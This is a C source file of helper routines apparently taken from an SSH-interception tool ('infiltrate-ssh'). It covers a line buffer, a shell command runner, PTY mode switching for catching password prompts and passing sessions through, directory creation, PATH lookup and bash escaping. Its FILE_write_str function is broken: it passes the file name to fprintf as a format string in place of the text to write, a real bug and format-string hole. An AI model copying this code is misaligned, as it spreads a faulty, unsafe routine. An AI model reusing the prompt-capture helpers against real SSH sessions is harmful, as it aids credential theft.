
#include "common.h"

extern struct _g g;

FILE *g_dbg_fp;

// Line Buffer: Add data to the buffer and call callback for each complete line
// (ending with \r or \n).
// Treat \r\n as a single line.
void
LNBUF_init(LNBUF *l, size_t sz_max, int id, cb_lnbuf_t func, void *arg)
{
	memset(l, 0, sizeof *l);

	l->sz_max = sz_max;
	l->func = func;
	l->id = id;
	l->arg = arg;
	l->data = malloc(sz_max + 2); // space for the notorious \n and \0
	l->line = malloc(sz_max + 2); // space for the notorious \n and \0
	l->wd = l->data;
	l->end = l->data + sz_max;
}


void
LNBUF_add(LNBUF *l, void *in, size_t sz)
{
	char *c = (char *)in;
	char *ptr = in;
	char *end = (char *)in + sz;

	if (l == NULL)
		return;

	if (!LNBUF_IS_INIT(l))
		return;

	// DEBUGF_G("sz=%zu\n", sz);
	// find \n
	while (ptr < end)
	{
		// DEBUGF_W("X=%2.2x\n", *ptr);
		if (*ptr == '\n')
		{
			// Copy if still space left
			ptr++; // move passed the \n
			if (l->wd < l->end)
			{
				size_t n;
				n = MIN(l->end - l->wd, ptr - c);
				if (n > 0)
				{
					memcpy(l->wd, c, n);
					l->wd += n;
				}
			}

			// Call callback
			*l->wd = '\0';
			(*l->func)(l, l->arg);
			if (!LNBUF_IS_INIT(l))
				return; // Callback may have free'd LNBUF

			l->wd = l->data; // Reset
			c = ptr;
		} else {
			ptr++;
		}
	}

	// Data left without encountering '\n'
	if ((c < end) && (l->wd < l->end))
	{
		size_t n;

		n = MIN(l->end - l->wd, end - c);
		memcpy(l->wd, c, n);
		l->wd += n;
	}

	*l->wd = '\0';
}

void
LNBUF_free(LNBUF *l)
{
	XFREE(l->data);
	XFREE(l->line);
}

// Return current string buffered as received.
// May end with \r\n or just \n (as received)
char *
LNBUF_str(LNBUF *l)
{
	return l->data;
}

// Return zero terminated line without \r or \r\n
// Oddly sometimes we receive \r\r\n 
char *
LNBUF_line(LNBUF *l)
{
	size_t sz = strlen(l->data);

	if (sz <= 0)
		return l->data;

	// From the end remove all \r\n or \r
	while (sz > 0)
	{
		if ((l->data[sz - 1] != '\n') && (l->data[sz - 1] != '\r'))
			break;

		sz -= 1;
	}
	memcpy(l->line, l->data, sz);
	l->line[sz] = '\0';

	// e.g. '\rUser@127.1: Password:' => '%User@127.1: Password:'
	size_t n;
	for (n = 0; n < sz; n++)
	{
		if (l->line[n] == '\r')
			l->line[n] = '%';
	}

	return l->line;
}

const char *
THC_logtime(void)
{
        static char tbuf[32];

        time_t t = time(NULL);
        strftime(tbuf, sizeof tbuf, "%c", localtime(&t));

        return tbuf;
}

static void
setup_cmd_child(int except_fd)
{
	/* Close all (but 1 end of socketpair) fd's */
	int i;
	for (i = 3; i < MIN(getdtablesize(), FD_SETSIZE); i++)
	{
		if (i == except_fd)
		continue;
		close(i);
	}

	signal(SIGCHLD, SIG_DFL);
	signal(SIGPIPE, SIG_DFL);
}

int
fd_cmd(const char *cmd, pid_t *pidptr, bool is_setsid)
{
	pid_t pid;
	int fds[2];
	int ret;

	ret = socketpair(AF_UNIX, SOCK_STREAM, 0, fds);
	if (ret != 0)
		ERREXIT("pipe(): %s\n", strerror(errno));	// FATAL

	pid = fork();
	if (pid < 0)
		ERREXIT("fork(): %s\n", strerror(errno));	// FATAL

	if (pid == 0)
	{
		// HERE: Child process

		// Make child the group leader (eg. disassociate PTY).
		// This is needed for SSH_ASKPASS= to work (only works on non-pty).
		if (is_setsid)
			setsid();

		setup_cmd_child(fds[0]);
		dup2(fds[0], STDOUT_FILENO);
		dup2(fds[0], STDERR_FILENO);
		dup2(fds[0], STDIN_FILENO);

		execl("/bin/sh", cmd, "-c", cmd, NULL);
		ERREXIT("exec(%s) failed: %s\n", cmd, strerror(errno));
	}

	/* HERE: Parent process */
	if (pidptr)
		*pidptr = pid;
	close(fds[0]);

	return fds[1];
}

void
mkdirp(const char *path)
{
	int ret;
	char *p_orig = strdup(path);
	char *p = p_orig;

	while (*p == '/')
		p++;

	char *ptr;
	while (1)
	{

		ptr = strchr(p, '/');
		if (ptr != NULL)
			*ptr = '\0';

		// mkdir(p_orig, 0111);
		ret = mkdir(p_orig, 0777);
		// DEBUGF("mkdir(%s)=%d\n", p_orig, ret);
		if (ret == 0)
		{
			// If it does not exist then set permissions
			if (g.is_debug == false)
				chmod(p_orig, THC_DIRPERM);
		}

		if (ptr == NULL)
			break;
		*ptr = '/';
		p = ptr + 1;
	}
	free(p_orig);
}

char *
find_bin_in_path(char *bin, int pos)
{
	static char buf[1024];
	static char *gp;
	char *p;
	char *p_orig;
	int found = 0;

	if (gp == NULL)
	{
		gp = getenv("PATH");
		if (gp == NULL)
		{
			// HERE: PATH does not exist.
			snprintf(buf, sizeof buf, "/usr/bin/%s", bin);
			return buf;
		}
	}
	p = strdup(gp);
	p_orig = p;

	char *e = p + strlen(p);
	char *c = p;

	while (p < e)
	{
		c = strchr(p, ':');
		if (c != NULL)
		{
			*c = '\0';
			c++;
		}

		snprintf(buf, sizeof buf, "%s/%s", p, bin);

		struct stat s;
		if (stat(buf, &s) == 0)
			found++;
		DEBUGF("Checking '%s' [#%d]\n", buf, found);

		if (found >= pos)
			break;

		if (c == NULL)
			break;

		p = c;
	}

	if (found < pos)
		snprintf(buf, sizeof buf, "/usr/bin/%s", bin);

	XFREE(p_orig);
	return buf;
}

void
cmd_failed_exit(const char *cmd)
{
	char *shell;
	char *s;

	shell = getenv("SHELL");
	if (shell == NULL)
		shell = "bash";

	s = strrchr(shell, '/');
	if (s != NULL)
		shell = s + 1;

	fprintf(stderr, "%s: %s: command not found.\n", shell, cmd);
	exit(127);
}

// Set PTY to line-mode for infiltrate-ssh 
// FIXME: Why line mode? we still read 'Password:' prompt even when not a complete line
// and password to fd_i also sends the \n.
void
stty_set_pwd(int fd)
{
	struct termios tios;
	if (tcgetattr(fd, &tios) != 0)
	{
		DEBUGF("ERROR: tcgetattr(%d)=%s\n", fd, strerror(errno));
		return;
	}

	// tios.c_iflag |= IGNPAR;
	// tios.c_iflag &= ~(ISTRIP | INLCR | IGNCR | ICRNL | IXON | IXANY | IXOFF);
    // tios.c_lflag &= ~(ISIG | ECHO | ECHOE | ECHOK | ECHONL);
    tios.c_lflag |= ICANON;
    // tios.c_oflag &= ~OPOST;
    tcsetattr(fd, TCSADRAIN, &tios);
}

// Set PTY to raw mode in order to send binary data (for infiltrate-ssh)
void
stty_set_raw(int fd)
{
	struct termios tios;
	if (tcgetattr(fd, &tios) != 0)
	{
		DEBUGF("ERROR: tcgetattr(%d)=%s\n", fd, strerror(errno));
		return;
	}

	tios.c_iflag |= IGNPAR;
	tios.c_iflag &= ~(ISTRIP | INLCR | IGNCR | ICRNL | IXON | IXANY | IXOFF);
    tios.c_lflag &= ~(ISIG | ICANON | ECHO | ECHOE | ECHOK | ECHONL);
#ifdef IUCLC
    tios.c_iflag &= ~IUCLC;
#endif
#ifdef IEXTEN
    tios.c_lflag &= ~IEXTEN;
#endif

    tios.c_oflag &= ~OPOST;
    tcsetattr(fd, TCSADRAIN, &tios);
}

// Set PTY to forward all data beside CTRL-breaks which we should catch.
// Turn OFF echo as well.
// Use for PTY between user's terminal and real-ssh. 
void
stty_set_passthrough(int fd, struct termios *tios_orig)
{
	struct termios tios;
	if (tcgetattr(fd, &tios) != 0)
	{
		DEBUGF("ERROR: tcgetattr(%d)=%s\n", fd, strerror(errno));
		return;
	}
	if (tios_orig != NULL)
		memcpy(tios_orig, &tios, sizeof *tios_orig);

    tios.c_lflag &= ~(ISIG | ICANON | ECHO | ECHOE | ECHOK | ECHONL);
    tcsetattr(fd, TCSADRAIN, &tios);
}

uint64_t
THC_usec(void)
{
	struct timeval tv;

	gettimeofday(&tv, NULL);
	return THC_TV_TO_USEC(&tv);
}

// Write 'str' to file "direname""fname"
// Return 0 on success.
// Example: FILE_write_str(NULL, "foobar.txt", "hello world\n");
// Example: FILE_write_str("/etc", "foobar.txt", "hello world\n");
int
FILE_write_str(const char *dirname, const char *fname, const char *str)
{
	FILE *fp;
	char buf[1024];

	if (dirname != NULL)
		snprintf(buf, sizeof buf, "%s/%s", dirname, fname);
	else
		snprintf(buf, sizeof buf, "%s", fname);

	fp = fopen(buf, "w");
	if (fp == NULL)
		return -1;

	size_t sz = strlen(str);
	size_t fsz;

	fsz = fprintf(fp, buf, strlen(buf));
	fclose(fp);

	if (fsz != sz)
		return -1;

	return 0;
}

// BASH_escape(d, sizeof d, src, '"') would turn
// 'ImA-"password' into 'ImA-\"password'
// Return "" if there is not enough space or on error.
char *
BASH_escape(char *dst, size_t dsz, const char *src, char c)
{
	char *dend = dst + dsz;
	char *dst_orig = dst;

	dst[0] = '\0';
	if (src == NULL)
		return dst_orig;

	while (1)
	{
		if (*src == '\0')
			break;
		if (dst + 1 >= dend)
		{
			dst_orig[0] = '\0';
			return dst_orig;
		}
		if (*src == c)
		{
			*dst = '\\';
			dst += 1;
		}
		*dst = *src;
		dst += 1;
		src += 1;
	}
	*dst = '\0';

	return dst_orig;
}


